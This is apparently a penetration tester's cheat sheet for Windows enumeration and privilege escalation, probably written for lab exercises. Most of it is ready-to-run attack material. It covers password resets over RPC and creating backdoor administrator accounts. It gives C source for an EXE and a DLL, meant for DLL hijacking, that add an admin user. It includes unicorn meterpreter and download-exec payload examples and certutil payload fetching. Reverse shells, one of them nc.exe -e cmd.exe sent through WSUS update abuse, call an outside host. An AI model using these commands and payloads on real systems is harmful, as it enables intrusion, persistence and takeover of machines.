### Known Enumeration:
Enum4linux -> https://github.com/CiscoCXSecurity/enum4linux
Impacket -> https://github.com/fortra/impacket
Kerbrute -> https://github.com/ropnop/kerbrute
CrackmapExec -> https://github.com/byt3bl33d3r/CrackMapExec
### Enum4linux #
`enum4linux -a IP`
`enum4linux -a IP -u username -p password`
### Basic commands ###
Displays local group information `whoami /all` | `getuid`  
local services and local ports `ps | netstat -anop`  | ``netstat -a -n -p tcp -o``
List all used drives `wmic logicaldisk get name`
List local users `Get-LocalUser`
List all domain joined users `net user /domain`
List more details about specific user `net user "admin" /domain`
List more details about specific group `net group "groupname" /domain`
List all domain groups `net group /domain`
List all local groups `Get-LocalGroup` | `Get-LocalGroupMember adminteam`
List routing table `route print`
Get process `Get-Process`
List active network connections `netstat -ano` | `netstat -anp TCP | find "2222"`
Check installed software `Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`
Check specific file extension 
`Get-ChildItem -Path C:\ -Include *.zip -File -Recurse -ErrorAction SilentlyContinue` 
`Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue` 
`Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue`
Run as different user `runas /user:backupadmin cmd`
Powershell history `Get-History` | `(Get-PSReadlineOption).HistorySavePath`
`type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
`

Check services `Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}`
Check permission on file `icacls "C:\xampp\apache\bin\httpd.exe"`
Restart server `shutdown /r /t 0`
Get all scheduled tasks `schtasks /query /fo LIST /v` 
Get all KB's `Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description -eq "Security Update" }`
Find what service is using what port `Get-Process -Id (Get-NetTCPConnection -LocalPort 5040).OwningProcess`
List all env `gci env:* | sort-object name` 

### Change user password:
```
// Change the password of the Jackie user with Lisa credentials:

net rpc password jackie -U lisa -S 192.168.221.162

// FOR DOMAIN:
net rpc password "jackie" -U "sub.poseidon.yzx""/lisa" -S 192.168.193.162


rpcclient -U sub.poseidon.yzx/lisa 192.168.221.162
rpcclient $> setuserinfo2 jackie 23 Passw@rd@123
```
#### Start Shell as other user:
```
./runas.exe C.Bum Tikkycoll_431012284 cmd -r 10.10.16.7:1234
```

#### Powershell start new session as different user
`$password = ConvertTo-SecureString "^1+>pdRLwyct]j,CYmyi" -AsPlainText -Force`
`$cred = New-Object System.Management.Automation.PSCredential("z.thomas", $password)`
`Enter-PSSession -ComputerName DC01 -Credential $cred`
### Interesting files
Hosts file `C:\Windows\System32\driver\`
#### Create new user
```
net user "poellie" Password@01 /add 
net localgroup Administrators "poellie" /add  
net localgroup "Remote Desktop Users" "poellie" /add
```

## Port Scanner
Port List single IP
`_1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect(“192.168.1.1”,$_)) “Port $_ is open!”} 2>$null_`

Port List multiple IP
```
_“192.168.1.1”,”10.1.1.2" | % { $a = $_; write-host “ — — — “; write-host “$a”; 80,443,445,8080 | % {echo ((new-object Net.Sockets.TcpClient).Connect(“$a”,$_)) “Port $_ is open!”} 2>$null}_
```

### Unquoted Service Paths
```
C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My Program\My.exe
C:\Program Files\My Program\My service\service.exe
```
#### Add new service

`Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"`

CD to where the binary is located: 
PS> New-Service                                        
TestService                                                                                                                                       BinaryPathName: C:\Users\offsec\Desktop\scheduler.exe 
### Payload All The Things ###
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
### Memory dumping ###
Get all processes `Get-Process`
Get specific process `Get-Process -name firefox`
Dump using #procdump `.\procdump.exe -ma 1528 firefox.dmp`
### User information gathering
List all properties of user `Get-ADUser -identity s.smith -properties *  
### Upgrade Powershell 
https://github.com/trustedsec/unicorn
```
Usage: python unicorn.py payload reverse_ipaddr port <optional hta or macro, crt>
PS Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443
PS Down/Exec: python unicorn.py windows/download_exec url=http://badurl.com/payload.exe
Macro Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 macro
Macro Example CS: python unicorn.py <cobalt_strike_file.cs> cs macro
Macro Example Shellcode: python unicorn.py <path_to_shellcode.txt> shellcode macro
HTA Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 hta
HTA Example CS: python unicorn.py <cobalt_strike_file.cs> cs hta
HTA Example Shellcode: python unicorn.py <path_to_shellcode.txt>: shellcode hta
DDE Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 dde
CRT Example: python unicorn.py <path_to_payload/exe_encode> crt
Custom PS1 Example: python unicorn.py <path to ps1 file>
Custom PS1 Example: python unicorn.py <path to ps1 file> macro 500
Cobalt Strike Example: python unicorn.py <cobalt_strike_file.cs> cs (export CS in C# format)
Custom Shellcode: python unicorn.py <path_to_shellcode.txt> shellcode (formatted 0x00)
Help Menu: python unicorn.py --help
```

#### Add user exe from C script
```
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user poellie password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}

x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```
### Priv Esc Checker
https://github.com/itm4n/PrivescCheck/tree/master
```
Import-Module ./PrivEschChecker.ps1
Invoke-PrivEscCheck
```

#### Basic DLL to add user 
```
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user dave3 password123! /add");
  	    i = system ("net localgroup administrators dave3 /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}

x86_64-w64-mingw32-gcc TextShaping.cpp --shared -o TextShaping.dll
```

### DLL Hijack
Current listing of where the DLL is loaded from, DLL search order:
```
1. The directory from which the application loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory. 
5. The current directory.
6. The directories that are listed in the PATH environment variable.
```

# Importing Powersploit Module

#Requires PowerUp

$ENV:PSModulePath
mkdir C:\Users\%username%\Documents\WindowsPowershell\Modules
cd C:\Users\%username%\Documents\WindowsPowershell\Modules
#Copy Powersploit to modules directory
certutil -urlcache -split -f http://10.0.0.1/powersploit-master.zip

#unpack zip
Expand-archive Powersploit-master.zip
cd into folder
import-module .\Powerspolit.psd1=
#Confirm that Powerspolit is listed

get-module

### WSUS Administrators:
https://github.com/GoSecure/WSuspicious?tab=readme-ov-file
https://gosecure.ai/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/
https://www.lrqa.com/en/cyber-labs/introducing-sharpwsus/

`WSuspicious.exe /command:" -accepteula -s -d -cmd /c ""net localgroup Administrators sflowers /add""" /autoinstall`

#### SharpWSUS:
Find the server: `SharpWSUS.exe locate`
Enumerate server: `SharpWSUS.exe inspect`
Create NC payload: `sharp.exe create /payload:"C:\temp\PsExec64.exe" /args:"-accepteula -s -d C:\temp\nc.exe -e cmd.exe 10.10.16.7 1234" /title:"man1"`
Then approve: `sharp.exe approve /updateid:ecec08bd-456d-4dc4-b3f4-6901c658e76c /computername:dc.outdated.htb /groupname:"kech"`
